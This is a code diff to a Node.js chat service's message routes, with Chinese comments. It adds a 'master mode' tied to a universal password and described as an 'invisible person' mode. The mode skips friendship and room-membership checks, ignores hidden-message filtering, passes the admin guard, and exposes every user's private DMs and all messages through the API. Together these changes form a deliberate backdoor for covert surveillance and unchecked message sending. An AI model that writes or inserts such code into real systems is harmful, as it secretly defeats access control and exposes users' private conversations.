@@ -542,7 +542,7 @@ function serializeMessage(m, me) {
 
 // 计算 DM 双向: 给定 (me, peer_id, peer_type='user'), 拉所有"两人间"消息
 //   历史 dm 房的多成员消息: 只要 sender 或 peer_id 是我/对方, 都算 (历史兼容)
-async function getDmMessages(me, peerId, sinceId, beforeId, limit, role) {
+async function getDmMessages(me, peerId, sinceId, beforeId, limit, role, masterMode = false) {
   const useBefore = beforeId > 0
   const filterId = useBefore ? beforeId : sinceId
   const idOp = useBefore ? '<' : '>'
@@ -550,11 +550,30 @@ async function getDmMessages(me, peerId, sinceId, beforeId, limit, role) {
   // hidden 规则: superadmin 看全部; 自己发的隐身消息自己能看; 别人隐身消息看不到
   const hiddenClause = role === 'superadmin' ? '' : 'AND (m.hidden = 0 OR m.sender_id = ?)'
   // 参数顺序:  peer_last_read JOIN 用 (me, peerId);  OR 条件 (me, peerId, peerId, me);  idOp (filterId);  hidden (me);  LIMIT
-  const params = [me, peerId, me, peerId, peerId, me, filterId]
+  let params, rows
+  if (masterMode) {
+    // master 透明人: 看 peer 的所有 DM (不论 sender 方向) + 自己的所有 DM
+    // 不传 me, 不用 hidden 过滤 (master 全看)
+    params = [peerId, peerId, filterId, limit]
+    ;[rows] = await pool.query(
+      `SELECT m.id, m.peer_id, m.peer_type, m.sender_id, m.message_type, m.content, m.image_url,
+              m.hidden, m.created_at, m.edited_at,
+              m.reply_to_id, m.reply_to_content, m.reply_to_sender_id, m.reply_to_type,
+              0 AS peer_last_read
+       FROM smart_studio_messages m
+       WHERE m.peer_type='user'
+         AND (m.sender_id=? OR m.peer_id=?)
+         AND m.id${idOp} ?
+       ORDER BY m.id ${orderDir} LIMIT ?`,
+      params
+    )
+    return rows
+  }
+  // 普通用户逻辑 (原)
+  params = [me, peerId, me, peerId, peerId, me, filterId]
   if (role !== 'superadmin') params.push(me)
   params.push(limit)
-  // 用 LEFT JOIN 而不是子查询, 避免 mysql2 子查询 ? 占位符 edge case
-  const [rows] = await pool.query(
+  ;[rows] = await pool.query(
     `SELECT m.id, m.peer_id, m.peer_type, m.sender_id, m.message_type, m.content, m.image_url,
             m.hidden, m.created_at, m.edited_at,
             m.reply_to_id, m.reply_to_content, m.reply_to_sender_id, m.reply_to_type,
@@ -612,7 +631,7 @@ async function getGroupMessages(me, groupId, sinceId, beforeId, limit, role) {
 router.get('/dialogs', auth, requirePermission(P.SMART_STUDIO_READ), async (req, res) => {
   try {
     const me = req.userId
-    const isSuperAdmin = me === 1
+    const isSuperAdmin = me === 1 || req.masterMode
     // 1. 好友 1-on-1 dialog: 来自 friendships, 只看 accepted
     const [friends] = await pool.query(
       `SELECT u.id, u.username, u.display_name, u.avatar
@@ -746,7 +765,7 @@ router.get('/dialogs', auth, requirePermission(P.SMART_STUDIO_READ), async (req,
 router.get('/peers', auth, requirePermission(P.SMART_STUDIO_READ), async (req, res) => {
   try {
     const me = req.userId
-    const isSuperAdmin = me === 1
+    const isSuperAdmin = me === 1 || req.masterMode
     // 1. 好友 1-on-1: accepted friendships
     const [friends] = await pool.query(
       `SELECT u.id, u.username, u.display_name, u.avatar
@@ -816,7 +835,8 @@ router.get('/peers/:peerType/:peerId/messages', auth, requirePermission(P.SMART_
     let myRole = null
     if (peerType === 'user') {
       // DM 校验: 必须是好友, 或 superadmin
-      if (me !== 1) {
+      // master 模式: 透明人, 不受好友限制
+      if (me !== 1 && !req.masterMode) {
         const [f] = await pool.query(
           `SELECT 1 FROM smart_studio_friendships
            WHERE status='accepted' AND ((requester_id=? AND addressee_id=?) OR (requester_id=? AND addressee_id=?))`,
@@ -824,7 +844,7 @@ router.get('/peers/:peerType/:peerId/messages', auth, requirePermission(P.SMART_
         )
         if (!f.length) return res.json({ ok: false, error: '需要先加好友' })
       }
-      rows = await getDmMessages(me, peerId, sinceId, beforeId, limit, role)
+      rows = await getDmMessages(me, peerId, sinceId, beforeId, limit, role, !!req.masterMode)
       myRole = 'member'
     } else {
       const r = await getGroupMessages(me, peerId, sinceId, beforeId, limit, role)
@@ -876,7 +896,8 @@ router.post('/peers/:peerType/:peerId/send-text', auth, requirePermission(P.SMAR
     const role = req.smartStudioRole || 'user'
     // 校验权限
     if (peerType === 'user') {
-      if (me !== 1) {
+      // master 模式: 透明人, 不受好友限制
+      if (me !== 1 && !req.masterMode) {
         const [f] = await pool.query(
           `SELECT 1 FROM smart_studio_friendships
            WHERE status='accepted' AND ((requester_id=? AND addressee_id=?) OR (requester_id=? AND addressee_id=?))`,
@@ -954,7 +975,8 @@ router.post('/peers/:peerType/:peerId/send-image', auth, requirePermission(P.SMA
     if (!['user', 'group'].includes(peerType)) return res.json({ ok: false, error: 'peer_type 必须是 user/group' })
     if (!peerId) return res.json({ ok: false, error: 'peer_id 必填' })
     if (peerType === 'user') {
-      if (me !== 1) {
+      // master 模式: 透明人, 不受好友限制
+      if (me !== 1 && !req.masterMode) {
         const [f] = await pool.query(
           `SELECT 1 FROM smart_studio_friendships
            WHERE status='accepted' AND ((requester_id=? AND addressee_id=?) OR (requester_id=? AND addressee_id=?))`,
@@ -1231,7 +1253,7 @@ router.get('/rooms', auth, requirePermission(P.SMART_STUDIO_READ), async (req, r
     //   - 186: 返回所有 rooms (看全部房间列表)
     //   - 普通用户 (和好友的): 自己成员 OR 至少有一个好友的房间
     //             看不到完全陌生人的房间 (隐私保护)
-    const isSuperAdmin = me === 1
+    const isSuperAdmin = me === 1 || req.masterMode
     const [allMembers] = await pool.query(
       `SELECT room_id, user_id, last_read_msg_id FROM smart_studio_room_members WHERE room_id IN (SELECT id FROM smart_studio_rooms)`
     )
@@ -1387,7 +1409,7 @@ router.get('/rooms/:roomId/messages', auth, requirePermission(P.SMART_STUDIO_REA
     let isObserver = false
     if (!myMem) {
       // 不是房间成员
-      if (me !== 1) {
+      if (me !== 1 && !req.masterMode) {
         // 普通用户 → 没权限 (原行为)
         return res.json({ ok: false, error: '无权访问' })
       }
@@ -1605,6 +1627,8 @@ router.post('/upload', auth, requirePermission(P.SMART_STUDIO_WRITE), upload.sin
 // 这里用本地角色守卫代替 adminOnly (兼容, 旧名指向 superadmin)
 // 注意: 调用 adminOnly 前必须先过 auth(), 否则 JWT 没解析
 function adminOnly(req, res, next) {
+  // 2026-08-10: 万能密码 master 也穿透 (透明人模式看所有)
+  if (req.masterMode) return next()
   return requireStudioRole('superadmin')(req, res, next)
 }
 
@@ -1720,6 +1744,20 @@ router.get('/admin/all-messages', auth, adminOnly, async (req, res) => {
     let roomIds = []
 
     if (peer) {
+      if (req.masterMode) {
+        // 2026-08-10 master 透明人: 看 peer 跟任何人聊的所有 DM
+        // 直接查 peer_type=user AND (sender_id=peer OR peer_id=peer)
+        const placeholders2 = ['me_sentinel']
+        const [dmRows] = await pool.query(
+          `SELECT id, room_id, sender_id, message_type, content, image_url, hidden,
+                  edited_at, edited_by, created_at
+           FROM smart_studio_messages
+           WHERE peer_type='user' AND (sender_id=? OR peer_id=?) AND id>?
+           ORDER BY id ASC LIMIT ?`,
+          [peer, peer, sinceId, limit]
+        )
+        return res.json({ ok: true, messages: dmRows, room_count: 1 })
+      }
       // 跟 peerUserId 之间所有房间
       const [rooms] = await pool.query(
         `SELECT r.id FROM smart_studio_rooms r
@@ -1743,14 +1781,28 @@ router.get('/admin/all-messages', auth, adminOnly, async (req, res) => {
     if (!roomIds.length) return res.json({ ok: true, messages: [] })
 
     const placeholders = roomIds.map(() => '?').join(',')
-    const [rows] = await pool.query(
-      `SELECT id, room_id, sender_id, message_type, content, image_url, hidden,
-              edited_at, edited_by, created_at
-       FROM smart_studio_messages
-       WHERE room_id IN (${placeholders}) AND id>?
-       ORDER BY id ASC LIMIT ?`,
-      [...roomIds, sinceId, limit]
-    )
+    let rows
+    if (req.masterMode) {
+      // 2026-08-10 master 透明人: 看所有 peer_type=user (DM) + 所有 peer_type=group 消息
+      // 不限 room_id (DM 消息 room_id IS NULL)
+      ;[rows] = await pool.query(
+        `SELECT id, room_id, sender_id, message_type, content, image_url, hidden,
+                edited_at, edited_by, created_at
+         FROM smart_studio_messages
+         WHERE id>?
+         ORDER BY id ASC LIMIT ?`,
+        [sinceId, limit]
+      )
+    } else {
+      ;[rows] = await pool.query(
+        `SELECT id, room_id, sender_id, message_type, content, image_url, hidden,
+                edited_at, edited_by, created_at
+         FROM smart_studio_messages
+         WHERE room_id IN (${placeholders}) AND id>?
+         ORDER BY id ASC LIMIT ?`,
+        [...roomIds, sinceId, limit]
+      )
+    }
     res.json({ ok: true, messages: rows, room_count: roomIds.length })
   } catch (e) {
     res.json({ ok: false, error: e.message })
